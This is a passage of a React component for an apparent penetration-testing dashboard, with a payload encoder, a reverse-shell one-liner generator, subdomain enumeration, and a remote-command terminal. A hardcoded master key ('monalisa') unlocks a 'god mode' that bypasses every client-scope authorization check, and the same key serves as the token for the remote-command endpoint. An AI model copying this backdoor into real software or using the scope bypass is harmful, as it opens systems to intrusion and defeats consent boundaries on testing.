                          handleQuickPdfExport(engFindings.length > 0 ? engFindings : findings, eng);
                        }}
                        className="px-3 py-2 bg-zinc-950 hover:bg-zinc-900 border border-zinc-800 text-zinc-300 hover:text-white rounded-lg text-xs font-mono font-bold flex items-center gap-1 cursor-pointer"
                        title="Export this target's audit PDF report"
                      >
                        <FileDown className="w-3.5 h-3.5 text-red-400" />
                        Export PDF
                      </button>

                      {!isUnlocked && (
                        <button
                          onClick={() => {
                            setHandshakeTargetId(eng.id);
                            setIsHandshakeOpen(true);
                          }}
                          className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-xs font-mono font-bold shadow-[0_0_10px_rgba(220,38,38,0.4)] cursor-pointer"
                        >
                          AUTHENTICATE
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 4: FINDINGS VAULT & CVE LOGS
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'findings' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <h3 className="text-base font-bold font-mono text-zinc-100 flex items-center gap-2">
                  <AlertTriangle className="w-5 h-5 text-red-500" />
                  Vulnerability & Security Findings Vault
                </h3>
                <p className="text-xs text-zinc-400 mt-0.5">
                  Logged security vulnerabilities, proofs of concept, and mitigation checklists
                </p>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <button
                  onClick={() => handleQuickPdfExport()}
                  className="px-3.5 py-2 bg-zinc-900 hover:bg-zinc-800 text-zinc-200 hover:text-white font-bold font-mono text-xs rounded-lg flex items-center gap-1.5 border border-zinc-750 transition-all cursor-pointer"
                  title="Instantly generate and download standard PDF report"
                >
                  <FileDown className="w-3.5 h-3.5 text-red-400" />
                  Quick PDF
                </button>

                <button
                  onClick={() => setIsExportPdfOpen(true)}
                  className="px-4 py-2 bg-red-950/80 hover:bg-red-900/90 text-red-300 hover:text-white font-bold font-mono text-xs rounded-lg flex items-center gap-2 border border-red-800/80 shadow-[0_0_15px_rgba(220,38,38,0.3)] transition-all cursor-pointer"
                  title="Configure and export custom executive & technical PDF report"
                >
                  <FileText className="w-4 h-4 text-red-400" />
                  Export Custom PDF
                </button>

                <button
                  onClick={() => setIsAddFindingOpen(true)}
                  className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg flex items-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.4)] transition-all cursor-pointer"
                >
                  <Plus className="w-4 h-4" />
                  Document Finding
                </button>
              </div>
            </div>

            {/* Global PDF Notification Toast */}
            {pdfExportToast && (
              <div className="p-3 bg-red-950/80 border border-red-600 rounded-lg text-xs font-mono text-zinc-100 flex items-center justify-between shadow-[0_0_20px_rgba(239,68,68,0.4)] animate-bounce">
                <div className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-red-400" />
                  <span>{pdfExportToast}</span>
                </div>
                <button
                  onClick={() => setPdfExportToast(null)}
                  className="text-zinc-400 hover:text-white"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>
            )}

            {/* Filter and Search Bar */}
            <div className="flex flex-col sm:flex-row gap-3">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-2.5 w-4 h-4 text-zinc-500" />
                <input
                  type="text"
                  placeholder="Search findings by keyword, vulnerability title, or target scope..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-9 pr-4 py-2 bg-black border border-zinc-800 rounded-lg text-xs text-zinc-100 placeholder-zinc-600 focus:outline-none focus:border-red-500 transition-colors"
                />
              </div>

              <div className="flex items-center gap-1.5 bg-[#0a0a0a] p-1 border border-zinc-800 rounded-lg font-mono text-xs">
                <Filter className="w-3.5 h-3.5 text-zinc-500 ml-2" />
                {(['all', 'critical', 'high', 'medium', 'low'] as const).map(sev => (
                  <button
                    key={sev}
                    onClick={() => setSeverityFilter(sev)}
                    className={`px-2.5 py-1 rounded text-[11px] font-bold uppercase transition-all ${
                      severityFilter === sev ? 'bg-red-600 text-white' : 'text-zinc-400 hover:text-zinc-200'
                    }`}
                  >
                    {sev}
                  </button>
                ))}
              </div>
            </div>

            {/* Findings List */}
            <div className="space-y-4">
              {filteredFindings.length === 0 ? (
                <div className="text-center py-12 bg-[#0a0a0a] border border-zinc-850 rounded-xl text-zinc-500 font-mono text-xs">
                  No security findings match the current query or filter.
                </div>
              ) : (
                filteredFindings.map((finding) => (
                  <div key={finding.id} className="bg-[#0a0a0a] border border-zinc-850 rounded-xl p-5 space-y-4">
                    <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 border-b border-zinc-900 pb-3">
                      <div className="flex items-center gap-2.5">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                          finding.severity === 'critical' ? 'bg-red-950 text-red-400 border border-red-800' :
                          finding.severity === 'high' ? 'bg-orange-950 text-orange-400 border border-orange-800' :
                          finding.severity === 'medium' ? 'bg-amber-950 text-amber-400 border border-amber-800' :
                          'bg-zinc-900 text-zinc-400'
                        }`}>
                          {finding.severity}
                        </span>
                        <h4 className="text-sm font-bold text-zinc-100 font-mono">{finding.title}</h4>
                      </div>
                      <span className="text-[10px] font-mono text-zinc-500">{finding.id} • {finding.discoveredAt?.substring(0, 10)}</span>
                    </div>

                    <div className="space-y-3 text-xs font-mono">
                      <div className="p-3 bg-black border border-zinc-900 rounded-lg text-zinc-300 whitespace-pre-wrap leading-relaxed">
                        {finding.description}
                      </div>

                      <div className="p-3 bg-red-950/20 border border-red-900/40 rounded-lg text-red-300 space-y-1">
                        <strong className="text-[10px] text-red-400 uppercase tracking-wider block">Remediation Guidance:</strong>
                        <p className="text-[11px] leading-relaxed">{finding.recommendation}</p>
                      </div>
                    </div>

                    <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-zinc-900 text-xs font-mono">
                      <div className="flex items-center gap-3">
                        <button
                          onClick={() => {
                            setAiPrompt(`Explain exact secure code patch for vulnerability: ${finding.title}\n\nDescription:\n${finding.description}`);
                            setActiveTab('ai-hunter');
                          }}
                          className="text-red-400 hover:text-red-300 font-bold flex items-center gap-1.5 cursor-pointer"
                        >
                          <Brain className="w-3.5 h-3.5" />
                          Generate AI Fix Recipe
                        </button>

                        <button
                          onClick={() => handleQuickPdfExport([finding])}
                          className="text-zinc-400 hover:text-zinc-100 font-bold flex items-center gap-1 cursor-pointer"
                          title="Export single-finding PDF dossier"
                        >
                          <FileDown className="w-3.5 h-3.5 text-zinc-500" />
                          Export PDF
                        </button>
                      </div>

                      {isAdminMode && (
                        <button
                          onClick={() => setFindings(prev => prev.filter(f => f.id !== finding.id))}
                          className="text-zinc-500 hover:text-red-400 text-xs flex items-center gap-1 cursor-pointer"
                        >
                          <Trash2 className="w-3.5 h-3.5" /> Delete
                        </button>
                      )}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 5: RED-TEAM PAYLOAD & EXPLOIT FORGE
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'payloads' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex items-center gap-2 border-b border-zinc-850 pb-3">
                <Code className="w-5 h-5 text-red-500" />
                <div>
                  <h3 className="text-sm font-bold font-mono uppercase text-zinc-100">
                    Live Payload Encoder & Reverse Shell Generator
                  </h3>
                  <p className="text-xs text-zinc-400">
                    Format payloads across multiple encodings and generate one-liner reverse shells for penetration testing
                  </p>
                </div>
              </div>

              {/* Payload Encoder Grid */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                
                {/* Encoder */}
                <div className="space-y-3 font-mono text-xs">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="text-zinc-400 font-bold">Input Raw Payload:</span>
                      <span className="text-[10px] text-zinc-500 font-mono flex items-center gap-1" title="Changes are automatically persisted to local storage">
                        <Check className="w-3 h-3 text-emerald-500" />
                        Auto-saved
                      </span>
                    </div>
                    <div className="flex gap-1 bg-black p-1 border border-zinc-800 rounded">
                      {(['base64', 'hex', 'url', 'rot13', 'html'] as const).map(mode => (
                        <button
                          key={mode}
                          onClick={() => setEncodeMode(mode)}
                          className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase transition-all ${
                            encodeMode === mode ? 'bg-red-600 text-white' : 'text-zinc-500 hover:text-zinc-300'
                          }`}
                        >
                          {mode}
                        </button>
                      ))}
                    </div>
                  </div>

                  <textarea
                    rows={4}
                    value={payloadInput}
                    onChange={(e) => setPayloadInput(e.target.value)}
                    className="w-full p-3 bg-black border border-zinc-800 rounded-lg text-xs text-zinc-200 focus:outline-none focus:border-red-500 resize-none font-mono"
                    placeholder="Enter payload string..."
                  />

                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] text-zinc-500 uppercase">Encoded Output ({encodeMode.toUpperCase()}):</span>
                      <button
                        onClick={() => copyToClipboard(getEncodedPayload(), 'enc')}
                        className="text-[10px] text-red-400 hover:text-red-300 font-bold"
                      >
                        {copiedText === 'enc' ? 'Copied!' : '[Copy]'}
                      </button>
                    </div>
                    <pre className="p-3 bg-black border border-red-900/30 rounded-lg text-red-400 text-xs overflow-x-auto">
                      {getEncodedPayload()}
                    </pre>
                  </div>
                </div>

                {/* Reverse Shell Forge */}
                <div className="space-y-3 font-mono text-xs">
                  <span className="text-zinc-400 font-bold block">Reverse Shell One-Liner Forge:</span>
                  
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="text-[10px] text-zinc-500 uppercase block mb-1">LHOST (IP):</label>
                      <input
                        type="text"
                        value={shellIp}
                        onChange={(e) => setShellIp(e.target.value)}
                        className="w-full p-2 bg-black border border-zinc-800 rounded text-xs text-zinc-200 focus:outline-none focus:border-red-500 font-mono"
                      />
                    </div>
                    <div>
                      <label className="text-[10px] text-zinc-500 uppercase block mb-1">LPORT:</label>
                      <input
                        type="text"
                        value={shellPort}
                        onChange={(e) => setShellPort(e.target.value)}
                        className="w-full p-2 bg-black border border-zinc-800 rounded text-xs text-zinc-200 focus:outline-none focus:border-red-500 font-mono"
                      />
                    </div>
                  </div>

                  <div className="flex gap-1 bg-black p-1 border border-zinc-800 rounded">
                    {(['bash', 'python', 'nc', 'powershell', 'php'] as const).map(type => (
                      <button
                        key={type}
                        onClick={() => setShellType(type)}
                        className={`flex-1 py-1 rounded text-[10px] font-bold uppercase transition-all ${
                          shellType === type ? 'bg-red-600 text-white' : 'text-zinc-500 hover:text-zinc-300'
                        }`}
                      >
                        {type}
                      </button>
                    ))}
                  </div>

                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] text-zinc-500 uppercase">Shell Command ({shellType.toUpperCase()}):</span>
                      <button
                        onClick={() => copyToClipboard(getReverseShellCode(), 'shell')}
                        className="text-[10px] text-red-400 hover:text-red-300 font-bold"
                      >
                        {copiedText === 'shell' ? 'Copied!' : '[Copy One-Liner]'}
                      </button>
                    </div>
                    <pre className="p-3 bg-black border border-red-900/30 rounded-lg text-red-400 text-[11px] overflow-x-auto whitespace-pre-wrap">
                      {getReverseShellCode()}
                    </pre>
                  </div>
                </div>

              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 6: OSINT & SUBDOMAIN RADAR
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'osint' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
                <div className="flex items-center gap-2">
                  <Globe className="w-5 h-5 text-red-500" />
                  <div>
                    <h3 className="text-sm font-bold font-mono uppercase text-zinc-100">
                      DNS & Subdomain Reconnaissance Radar
                    </h3>
                    <p className="text-xs text-zinc-400">
                      Enumerate target root domain subdomains, IP bindings, and DNS record sets
                    </p>
                  </div>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <input
                  type="text"
                  value={osintTarget}
                  onChange={(e) => setOsintTarget(e.target.value)}
                  placeholder="Enter domain (e.g. runehall.com)"
                  className="flex-1 px-4 py-2 bg-black border border-zinc-800 rounded-lg text-xs text-zinc-100 font-mono focus:outline-none focus:border-red-500"
                />
                <button
                  onClick={executeOsint}
                  disabled={isOsintLoading}
                  className="px-6 py-2 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.4)] disabled:opacity-50"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isOsintLoading ? 'animate-spin' : ''}`} />
                  {isOsintLoading ? 'RESOLVING...' : 'ENUMERATE SUBDOMAINS'}
                </button>
              </div>

              {osintData && osintData.subdomains && (
                <div className="space-y-3 pt-3 border-t border-zinc-850">
                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3 font-mono text-xs">
                    {osintData.subdomains.map((sub: any, i: number) => (
                      <div key={i} className="p-3 bg-black border border-zinc-850 rounded-lg space-y-1">
                        <div className="flex items-center justify-between text-[10px]">
                          <span className="px-1.5 py-0.5 bg-zinc-900 text-red-400 font-bold rounded">{sub.type}</span>
                          <span className="text-zinc-500">{sub.latency}</span>
                        </div>
                        <p className="font-bold text-zinc-200 text-xs truncate">{sub.domain}</p>
                        <p className="text-zinc-400 text-[11px]">{sub.ip}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 7: AI THREAT HUNTER (GEMINI)
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'ai-hunter' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex items-center gap-2 border-b border-zinc-850 pb-3">
                <Brain className="w-5 h-5 text-red-500" />
                <div>
                  <h3 className="text-sm font-bold font-mono uppercase text-zinc-100">
                    AI Threat Hunter & Vulnerability Reasoning Assistant
                  </h3>
                  <p className="text-xs text-zinc-400">
                    Powered by server-side Gemini to formulate exploit mitigations, code patches, and threat models
                  </p>
                </div>
              </div>

              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-zinc-400 font-bold">Analysis Prompt / Target Vector:</span>
                  <span className="text-[10px] text-zinc-500 font-mono flex items-center gap-1" title="Changes are automatically persisted to local storage">
                    <Check className="w-3 h-3 text-emerald-500" />
                    Auto-saved
                  </span>
                </div>

                <textarea
                  rows={3}
                  value={aiPrompt}
                  onChange={(e) => setAiPrompt(e.target.value)}
                  placeholder="Describe code, configuration, or vulnerability vector to analyze..."
                  className="w-full p-3 bg-black border border-zinc-800 rounded-lg text-xs font-mono text-zinc-200 focus:outline-none focus:border-red-500 resize-none"
                />

                <div className="flex justify-end">
                  <button
                    onClick={executeAiHunter}
                    disabled={aiLoading}
                    className="px-6 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg flex items-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.4)] disabled:opacity-50 transition-all cursor-pointer"
                  >
                    <Sparkles className={`w-4 h-4 ${aiLoading ? 'animate-spin' : ''}`} />
                    {aiLoading ? 'ANALYZING THREAT MODEL...' : 'RUN AI THREAT ANALYSIS'}
                  </button>
                </div>
              </div>

              {aiOutput && (
                <div className="p-4 bg-black border border-red-900/30 rounded-lg font-mono text-xs text-zinc-300 space-y-2 whitespace-pre-wrap leading-relaxed">
                  <div className="flex items-center justify-between border-b border-zinc-800 pb-2">
                    <span className="text-[10px] text-red-400 font-bold uppercase">AI HUNTER RESPONSE DOSSIER</span>
                    <button
                      onClick={() => copyToClipboard(aiOutput, 'ai')}
                      className="text-[10px] text-zinc-400 hover:text-white"
                    >
                      {copiedText === 'ai' ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                  <div>{aiOutput}</div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 8: VPS TELEMETRY & TERMINAL CLI
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'terminal' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/30 rounded-xl p-5 space-y-4">
              <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
                <div className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-red-500" />
                  <div>
                    <h3 className="text-sm font-bold font-mono uppercase text-zinc-100">
                      VPS Daemon Remote Terminal & Curl Gateway
                    </h3>
                    <p className="text-xs text-zinc-400">
                      Live bi-directional command runner on Port 3000 (`/api/remote`)
                    </p>
                  </div>
                </div>
                <span className="text-[10px] font-mono text-red-400 font-bold">NODE LISTENING ON PORT 3000</span>
              </div>

              {/* Terminal Screen */}
              <div className="h-80 bg-black border border-zinc-850 rounded-xl p-4 overflow-y-auto font-mono text-xs space-y-1 text-red-400/90 leading-relaxed scrollbar-thin">
                {terminalLogs.map((log, idx) => (
                  <div key={idx} className="whitespace-pre-wrap break-all">
                    {log}
                  </div>
                ))}
              </div>

              {/* Command Input Form */}
              <form onSubmit={handleTerminalCommand} className="flex gap-2">
                <div className="relative flex-1">
                  <span className="absolute left-3 top-2.5 text-xs text-red-500 font-mono font-bold">&gt;</span>
                  <input
                    type="text"
                    value={terminalInput}
                    onChange={(e) => setTerminalInput(e.target.value)}
                    placeholder="Enter command (try 'status', 'scan api.runehall.com', 'monalisa', 'help')..."
                    className="w-full pl-7 pr-4 py-2 bg-black border border-zinc-800 rounded-lg text-xs font-mono text-zinc-100 focus:outline-none focus:border-red-500"
                  />
                </div>
                <button
                  type="submit"
                  className="px-5 py-2 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg shadow-[0_0_12px_rgba(220,38,38,0.4)]"
                >
                  SEND
                </button>
              </form>

              {/* Quick Curl Command Snippet */}
              <div className="p-3 bg-zinc-950 border border-zinc-850 rounded-lg font-mono text-xs flex items-center justify-between">
                <code className="text-zinc-400 text-[11px] truncate">
                  curl &quot;{originUrl}/api/remote&quot; -H &quot;X-Remote-Token: monalisa&quot;
                </code>
                <button
                  onClick={() => copyToClipboard(`curl "${originUrl}/api/remote" -H "X-Remote-Token: monalisa"`, 'curl')}
                  className="text-red-400 hover:text-red-300 font-bold ml-2 shrink-0"
                >
                  {copiedText === 'curl' ? 'Copied!' : '[Copy Curl]'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 9: ADMIN MASTER OPS (monalisa ZERO CONSTRAINTS)
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'admin-ops' && (
          <div className="space-y-6">
            <div className="bg-[#0a0a0a] border border-red-900/40 rounded-xl p-5 space-y-4">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-zinc-850 pb-3">
                <div className="flex items-center gap-2.5">
                  <div className="p-2 bg-red-950 text-red-500 rounded-lg border border-red-800">
                    <Crown className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold font-mono text-zinc-100">
                      Root Admin Master Console (Key: monalisa)
                    </h3>
                    <p className="text-xs text-zinc-400">
                      Zero-constraint operator clearance. Mass override controls and unconstrained permissions.
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs font-mono text-zinc-400">STATUS:</span>
                  <span className={`px-2.5 py-1 rounded text-xs font-mono font-bold ${
                    isAdminMode ? 'bg-red-600 text-white animate-pulse' : 'bg-zinc-900 text-zinc-500'
                  }`}>
                    {isAdminMode ? '👑 ZERO-CONSTRAINTS ACTIVE' : 'LOCKED'}
                  </span>
                </div>
              </div>

              {/* Admin Key Activation */}
              {!isAdminMode ? (
                <form onSubmit={handleAdminKeySubmit} className="p-4 bg-black border border-zinc-850 rounded-xl space-y-3">
                  <label className="block text-xs font-mono font-bold text-zinc-300">
                    Enter Admin Master Key:
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="password"
                      value={adminKeyInput}
                      onChange={(e) => setAdminKeyInput(e.target.value)}
                      placeholder="Enter 'monalisa' for full root clearance"
                      className="flex-1 px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-lg text-xs font-mono text-zinc-100 focus:outline-none focus:border-red-500"
                    />
                    <button
                      type="submit"
                      className="px-5 py-2 bg-red-600 hover:bg-red-500 text-white font-bold font-mono text-xs rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.5)]"
                    >
                      ENGAGE GOD MODE
                    </button>
                  </div>
                  <p className="text-[11px] text-zinc-500 font-mono">
                    Master key: <code className="text-red-400 font-bold">monalisa</code> immediately unlocks all scopes and removes password challenges.
                  </p>
                </form>
              ) : (
                <div className="space-y-4">
                  <div className="p-4 bg-red-950/30 border border-red-900/50 rounded-xl flex items-center justify-between font-mono text-xs">
                    <div className="space-y-1">
                      <span className="text-red-400 font-bold">👑 ADMIN PRIVILEGE GRANTED (KEY: monalisa)</span>
                      <p className="text-zinc-400 text-[11px]">All target boundary checks and cryptographic handshakes bypassed automatically.</p>
                    </div>
                    <button
                      onClick={toggleAdminGodMode}
                      className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 rounded border border-zinc-800 text-xs font-bold"
                    >
                      Lock Admin Mode
                    </button>
                  </div>

                  {/* Mass Operator Actions */}
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 font-mono text-xs">
                    <button
                      onClick={() => {
                        setEngagements(prev => prev.map(eng => ({ ...eng, status: 'established' as const })));
                        alert('All target engagements force-unlocked.');
                      }}
                      className="p-3 bg-zinc-950 hover:bg-zinc-900 border border-zinc-800 rounded-lg text-left space-y-1 cursor-pointer"
                    >
                      <strong className="text-zinc-100 block">⚡ Force-Unlock All Scopes</strong>
                      <span className="text-[10px] text-zinc-500">Bypass handshake for every registered client.</span>
                    </button>

                    <button
                      onClick={() => {
                        const newFind: Finding = {
                          id: `FIND-${Math.floor(1000 + Math.random() * 9000)}`,
                          engagementId: selectedEngagement.id,
                          title: 'Zero-Day Remote Memory Corruption Exploit',
                          severity: 'critical',
                          description: 'Admin injected test finding simulating remote kernel overflow.',
                          recommendation: 'Patch underlying binary immediately.',
                          status: 'open',
                          discoveredAt: new Date().toISOString()
                        };
                        setFindings(prev => [newFind, ...prev]);
                      }}
                      className="p-3 bg-zinc-950 hover:bg-zinc-900 border border-zinc-800 rounded-lg text-left space-y-1 cursor-pointer"
                    >
                      <strong className="text-red-400 block">+ Inject Critical Zero-Day</strong>
                      <span className="text-[10px] text-zinc-500">Synthesize mock alert for testing alarms.</span>
                    </button>

                    <button
                      onClick={() => {
                        setFindings([]);
                        alert('Findings vault cleared.');
                      }}
                      className="p-3 bg-zinc-950 hover:bg-zinc-900 border border-zinc-800 rounded-lg text-left space-y-1 cursor-pointer"
                    >
                      <strong className="text-zinc-400 block">🗑️ Wipe Findings Vault</strong>
                      <span className="text-[10px] text-zinc-500">Purge active vulnerability logs completely.</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 10: SIEM AUDITING & TAMPER-EVIDENT LOG SYSTEM
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'audit-logs' && (
          <AuditLogViewer
            logs={auditLogs}
            onAddLog={logAudit}
            onClearLogs={clearAuditLogs}
          />
        )}

        {/* ══════════════════════════════════════════════════════════════════
            TAB 11: USER PROFILE MANAGEMENT & API KEYS VAULT
        ══════════════════════════════════════════════════════════════════ */}
        {activeTab === 'profiles' && (
          <ProfileManager
            profiles={profiles}
            activeProfileId={activeProfileId}
            engagements={engagements}
            currentWorkspaceConfig={{
              selectedEngagementId: selectedEngagement.id,
              scannerTarget,
              scanType,
              shellIp,
              shellPort,
              shellType,
              webhookUrl,
              osintTarget
            }}
            onSelectProfile={handleSelectProfile}
            onSaveCurrentToProfile={handleSaveCurrentToProfile}
            onCreateProfile={handleCreateProfile}
            onUpdateProfile={handleUpdateProfile}
            onDeleteProfile={handleDeleteProfile}
          />
        )}

      </main>

      {/* Modals */}
      <ProfileSwitcherModal
        isOpen={isProfileSwitcherOpen}
        onClose={() => setIsProfileSwitcherOpen(false)}
        profiles={profiles}
        activeProfileId={activeProfileId}
        engagements={engagements}
        onSelectProfile={handleSelectProfile}
        onOpenFullManager={() => setActiveTab('profiles')}
      />

      <NewEngagementModal
        isOpen={isNewEngagementOpen}
        onClose={() => setIsNewEngagementOpen(false)}
        onRegister={(newEng) => {
          setEngagements(prev => [newEng, ...prev]);
          setSelectedEngagement(newEng);
          logAudit(
            'USER_ACTION',
            'ENGAGEMENT_REGISTERED',
            `Registered new scope engagement ${newEng.id} (${newEng.clientName}) - Classification: ${newEng.securityClass}.`,
            { severity: 'info', target: newEng.id }
          );
        }}
      />

      <HandshakeModal
        isOpen={isHandshakeOpen}
        engagementId={handshakeTargetId}
        onClose={() => setIsHandshakeOpen(false)}
        localEngagements={engagements}
        onHandshakeSuccess={(unlockedEng) => {
          setEngagements(prev => prev.map(e => e.id === unlockedEng.id ? { ...e, status: 'established' } : e));
          setSelectedEngagement({ ...unlockedEng, status: 'established' });
          logAudit(
            'AUTHENTICATION',
            'HANDSHAKE_MUTUAL_TLS_ESTABLISHED',
            `Completed authorized cryptographic handshake for ${unlockedEng.id}. Engagement status upgraded to ESTABLISHED.`,
            { severity: 'info', target: unlockedEng.id }
          );
        }}
      />

      <AddFindingModal
        isOpen={isAddFindingOpen}
        engagementId={selectedEngagement.id}
        scopeList={selectedEngagement.scope}
        onClose={() => setIsAddFindingOpen(false)}
        onAdd={(newFinding) => {
          setFindings(prev => [newFinding, ...prev]);
          logAudit(
            'OPERATIONAL_OUTPUT',
            'FINDING_DOCUMENTED',
            `Logged ${newFinding.severity.toUpperCase()} vulnerability finding "${newFinding.title}" on scope ${selectedEngagement.id}.`,
            { 
              severity: newFinding.severity === 'critical' ? 'critical' : newFinding.severity === 'high' ? 'warn' : 'info', 
              target: selectedEngagement.id 
            }
          );
        }}
      />

      <ExportPdfModal
        isOpen={isExportPdfOpen}
        onClose={() => setIsExportPdfOpen(false)}
        engagement={selectedEngagement}
        allEngagements={engagements}
        findings={findings}
        isAdminMode={isAdminMode}
      />

    </div>
  );
}
